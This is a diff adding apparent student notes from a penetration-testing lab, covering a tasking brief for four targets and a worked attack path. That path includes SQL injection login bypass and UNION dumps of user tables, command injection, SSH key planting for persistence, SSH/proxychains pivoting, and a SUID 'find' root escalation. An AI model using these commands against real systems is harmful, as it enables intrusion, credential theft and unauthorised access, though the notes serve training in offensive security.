@@ -1333,3 +1333,171 @@ Example: ssh user2@10.50.18.4 -L 1115:192.168.28.189:3389 proxychains xfreerdp /
 
 Something cool mysql --user=webuser --pass=sqlpass
 
+
+
+
+Tasking
+All actions must be in accordance with mission brief, scope, and RoE.
+Complete the taskings on each referenced target below.
+Each heading is the hostname of a target. The first listed target’s hostname is “PublicFacingWebsite”.
+
+PublicFacingWebsite
+Perform Reconnaissance 
+    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
+    2. Actively scan and interact with target to find potential attack vectors.
+Attempt Exploitation || Gain Initial Access
+    1. Use information gained from reconnaissance to gain access to the system.
+    2. There are multiple ways to gain access, try to find all. 
+Find Additional Targets
+    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
+    2. Discover additional targets through analysis of information from post-exploitation tasks.
+    3. Discover potential vulnerable binary to attempt exploitation and read sensitive file at “/root/secret_msg.txt”
+Pivot to Found Targets
+    1. Pivot through network to other targets as you find them.
+NOTES
+    • 
+
+BestWebApp
+Perform Reconnaissance
+    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
+    2. Actively scan and interact with target to find potential attack vectors. 
+Attempt Exploitation
+    1. Attempt to retrieve privileged information from the target by using information found in reconnaissance. Reconnaissance from other targets within the network may have information relevant to any target.
+NOTES
+    • 
+
+RoundSensor
+Perform Reconnaissance
+    1. Actively scan and interact with target to find potential attack vectors.
+Attempt Exploitation || Gain Initial Access
+    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
+Find Additional Targets
+    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
+    2. Discover additional targets through analysis of information from post-exploitation tasks.
+Pivot to Found Targets
+    1. Pivot through network to other targets as you find them.
+NOTES
+    • 
+
+Windows-Workstation
+Perform Reconnaissance
+    1. Actively scan and interact with target to find potential attack vectors.
+Attempt Exploitation || Gain Initial Access
+    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
+Find Additional Targets
+    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
+    2. Discover additional targets through analysis of information from post-exploitation tasks.
+Pivot to Found Targets
+    1. Pivot through network to other targets as you find them.
+NOTES
+    • 
+
+
+#### Step 1 ####
+--Port Scanning IP & enumerate--
+nmap -p 80 --script=http-enum <IP address>    (Locates useful libraries that should be looked into)
+                                      /login.php
+                                      /login.html
+                                      /img
+                                      /scripts
+
+#### Step 2 ####
+--Employee Sign In using SQL Injection--    
+bob' OR 1='1 (user & pass)
+
+#cmd injection#
+; find / -name "*.ssh"    (finds ssh keys or location to insert)  Private key is for yourself **PUBLIC KEY IS UPLOADED**
+; ls -la     (lists everything in pwd that could be relevant)
+; whoami     (reveals user logged in as)
+
+#create/upload ssh key#
+lin-ops#  ssh-keygen -t rsa
+lin-ops#  cat /home/student/.ssh/id_rsa.pub
+vulnerable#   mkdir /var/www/.ssh
+vulnerable#   echo "public key" >> /var/www/.ssh/authorized_keys
+vulnerable#   cat /var/ww/.ssh/authorized_keys
+
+
+--URL on certain web links reveals vulnerability to inject--
+URL/<IP address>/login.php?username=bob' OR 1='1&passwd=bob' OR 1='1    (Gather all contents into login.php)
+
+--Upload link reveals that malicious injection could be used--
+-------------------------------------------------------------------------------------------------------------------
+
+#### Step 3 ####
+-Create Master Socket-
+-IP discovered in /etc/hosts-
+-Enumerate discovered IP-
+-Ping sweep with script-
+
+lin-ops#  ssh -MS /tmp/jump user2@10.50.158.70
+user2@public#  sudo -l
+  ls /var/tmp
+  ls /home
+  ps -elf
+  ls /etc/rsylog.d
+  cat *
+  uname -a   (for kernel version [4.15.0-213-generic])
+  ls -la /var/www/html
+  cat /var/ww/html/login.php   (could provide credentials)
+  mysql --user-webuser --pass=sqlpass
+  use session; 
+  show tables;
+  select * from session_log;
+  select * from user;
+  exit
+  <ping sweep script>  (identify all IP in network)
+                        192.168.28.165
+                        192.168.28.175
+
+lin-ops#  ssh -S /tmp/jump jump -O forward  -D9050
+lin-ops#  proxychains nmap 192.168.28.175        192.168.28.165
+                            port 2222, 8000        port 22, 8888
+                                              
+lin-ops#  ssh -S /tmp/jump jump -O forward -L1111:192.168.28.175:8000
+-----------------------------------------------------------------------
+127.0.0.1:1111
+#SQL Injection#
+product=1 or 1=1    (keep incrementing product #)
+product=7 UNION SELECT 1,2,3    (identify amount of columns)
+product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns    (Golden statement/Search for user created)
+                                                    information_schema
+                               DEFAULT DATABASES    mysql
+                                                    performance_schema
+
+product=7 UNION SELECT user_id,name,username FROM siteusers.users    (credentials located)
+
+lin-ops#  ssh -S /tmp/jump jump -O forward -L2222:192.168.28.165:22
+lin-ops#  ssh -MS /tmp/Round user3@127.0.0.1 -p 2222
+
+lin-ops#  ssh -S /tmp/Round jump
+$  shell
+user3@Round#  sudo -l
+  ls /var/tmp
+  ps -elf
+  cat /etc/crontab
+  find / -type f -perm /6000 2>/dev/null -ls    (find vulnerable binaries)
+  gtfobins  (input suspicious binaries to identify vulnerability) #FIND# #SUID#
+  find . -exec /bin/sh -p \; -quit
+
+# whoami    (root)
+  ls -la /root
+  cat ab.sh    (listening port found)
+  cat RE_ME.obs    (reverse engineering)
+      ---IN GHIDRA >> MEANS BIT SHIFT---
+          bit shift calculator 
+            right means left
+
+# <ping sweep script>    (192.168.28.189 found)
+--------------------------------------------------
+lib-ops#  ssh -S /tmp/jump jump -O cancel -D 9050
+lin-ops#  ssh -S /tmp/Round jump -O forward -D 9050
+lin-ops#  proxychains nmap 192.168.28.189
+                            ports 22, 135, 139, 445, 3389, 5357, 9999
+lin-ops#  ssh -S /tmp/Round jump -O forward -L3333:192.168.28.189:22 -L4444:192.168.28.189:3389 
+lin-ops#  ssh -MS /tmp/Winders Aaron@127.0.0.1 -p 3333
+lin-ops#  ssh -S /tmp/Winders jump 
+
+lin-ops#  xfreerdp /u:Aaron /v:localhost:4444 /dynamic-resolution +clipboard    (Add correct hostkey to filepath)
+
+
